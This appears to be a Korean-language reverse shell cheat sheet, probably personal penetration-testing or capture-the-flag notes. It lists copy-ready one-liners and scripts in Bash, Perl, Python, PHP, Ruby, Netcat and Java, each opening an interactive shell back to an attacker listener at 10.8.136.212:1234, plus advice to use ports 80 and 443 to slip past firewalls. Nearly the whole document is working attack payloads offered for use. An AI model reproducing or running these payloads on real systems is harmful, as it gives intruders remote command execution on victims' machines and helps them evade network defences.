# reverse shell

> 방화벽 우회를 위해 80, 443 등 신뢰성 있는 포트 사용 권고
> 사용법: 아래 `LHOST`/`LPORT`만 네 tun0 IP와 `nc -lvnp` 포트로 바꾸면 됨

```bash
LHOST="10.8.136.212"; LPORT=1234
```

### 1. Bash (Bourne Again SHell)

- 설명: 일부 Bash 버전(예: Ubuntu 10.10)에서 `/dev/tcp`를 사용해 소켓 통신을 합니다.
- 명령어:

  ```bash
  bash -i >& /dev/tcp/10.8.136.212/1234 0>&1

  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.136.212 1234 >/tmp/f
  ```

### 2. PERL (Practical Extraction and Report Language)

- 설명: `Socket` 모듈을 사용하여 TCP 연결을 설정하고, 표준 입출력(Standard Input/Output/Error)을 소켓으로 리디렉션합니다.
- 명령어:
  ```perl
  perl -e 'use Socket;$i="10.8.136.212";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  # $i=$LHOST, $p=$LPORT 로 수정해서 사용
  ```

### 3. Python

- 설명: `socket`, `subprocess`, `os` 모듈을 사용해 소켓을 생성하고 파일 기술자(File Descriptor)를 복제(dup2)하여 셸을 연결합니다.
- 단계별:
  ```python
  import socket
  import subprocess
  import os

  LHOST = "10.8.136.212"
  LPORT = 1234

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((LHOST, LPORT))

  os.dup2(s.fileno(), 0)
  os.dup2(s.fileno(), 1)
  os.dup2(s.fileno(), 2)

  subprocess.call(["/bin/bash", "-i"])
  ```
- 한줄용 (복사 바로 가능):
  ```python
  python3 -c '
  import socket,subprocess,os
  LHOST="10.8.136.212"; LPORT=1234
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect((LHOST,LPORT))
  os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
  subprocess.call(["/bin/sh","-i"])
  '
  ```

### 4. PHP (Hypertext Preprocessor)

- 설명: `fsockopen` 함수로 연결하고, 특정 파일 기술자(예: 3)를 셸의 입출력으로 리디렉션합니다.
- 명령어:

  ```php
  php -r '$sock=fsockopen("10.8.136.212",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
  ```

  ```php
  <?php
  $ip = '10.8.136.212'; // $LHOST
  $port = 1234;         // $LPORT
  $sock = fsockopen($ip, $port);
  $proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
  ?>
  ```

  ```php
  <?php $s=fsockopen("10.8.136.212",1234);proc_open("/bin/sh -i", [0=>$s,1=>$s,2=>$s],$p); ?>
  ```

### 5. Ruby

- 설명: `TCPSocket`을 열어 파일 기술자를 얻은 후, `sprintf`를 사용하여 셸 실행 시 입출력을 해당 기술자로 지정합니다.
- 명령어:
  ```ruby
  ruby -rsocket -e'f=TCPSocket.open("10.8.136.212",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
  # "10.8.136.212"=LHOST, 1234=LPORT
  ```

### 6. Netcat (nc)

- 설명 A: `-e` 옵션 사용 (제한적)
  - `-e` 옵션을 지원하는 Netcat 버전에서 사용되는 가장 간단한 방법입니다.
  - 명령어:
    ```bash
    nc -e /bin/sh 10.8.136.212 1234
    # 10.8.136.212=공격자IP, 1234=리스너포트
    ```
- 설명 B: 파이프(Pipe) 및 FIFO (First-In, First-Out) 사용
  - `-e` 옵션이 없거나 사용이 제한될 때 명명된 파이프(`/tmp/f`)를 이용해 셸의 입출력을 Netcat으로 연결하는 우회 기법입니다.
  - 명령어:
    ```bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.136.212 1234 >/tmp/f
    ```

### 7. Java

- 설명: Java의 `Runtime.getRuntime().exec()`를 사용하여 `/bin/bash`와 `/dev/tcp`를 통해 연결을 시도하는 명령어입니다. (제공된 원본 텍스트에서도 테스트되지 않은 제출물로 언급됨.)
- 명령어:
  ```java
  r = Runtime.getRuntime()
  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.8.136.212/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
  p.waitFor()
  // 10.8.136.212=LHOST, 1234=LPORT
  ```
